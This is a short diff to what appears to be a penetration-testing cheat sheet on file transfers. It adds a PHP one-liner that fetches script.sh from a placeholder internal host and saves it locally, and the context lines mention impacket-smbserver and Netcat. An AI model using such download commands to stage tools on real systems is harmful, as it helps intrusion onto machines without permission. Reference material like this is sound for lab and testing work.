@@ -50,6 +50,13 @@ impacket-smbserver -username user -password pass -port 4343 -smb2support Shared 
 
 <br />
 
+## PHP
+```
+php -r '$f = file_get_contents("http://10.x.x.x/script.sh"); file_put_contents("script.sh",$f);'
+```
+
+<br />
+
 ## Netcat
 Note there are multiple implementations of Netcat: netcat, ncat and nc to name a few.
 
